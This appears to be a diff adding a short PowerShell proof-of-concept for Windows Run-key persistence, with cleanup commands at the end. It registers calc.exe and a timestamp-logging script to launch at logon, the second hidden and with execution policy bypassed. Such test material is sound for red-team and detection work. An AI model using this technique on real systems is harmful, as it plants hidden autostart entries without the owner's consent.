@@ -1,0 +1,15 @@
+# PoC 1: Use calc.exe as payload
+Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'TestPersistence' -Value 'C:\Windows\System32\calc.exe'
+
+# PoC 2: Custom logging script
+# Step 1: Create benign script
+New-Item -Path 'C:\Users\Public\log-launch.ps1' -ItemType File -Force
+Add-Content -Path 'C:\Users\Public\log-launch.ps1' -Value "Add-Content -Path `"$env:USERPROFILE\poc_log.txt`" -Value `"`$(Get-Date): RunKey executed`""
+
+# Step 2: Register script with Run key
+Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'LogTest' -Value 'powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Public\log-launch.ps1'
+
+# Cleanup commands
+Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'TestPersistence' -ErrorAction SilentlyContinue
+Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'LogTest' -ErrorAction SilentlyContinue
+Remove-Item -Path 'C:\Users\Public\log-launch.ps1' -Force -ErrorAction SilentlyContinue
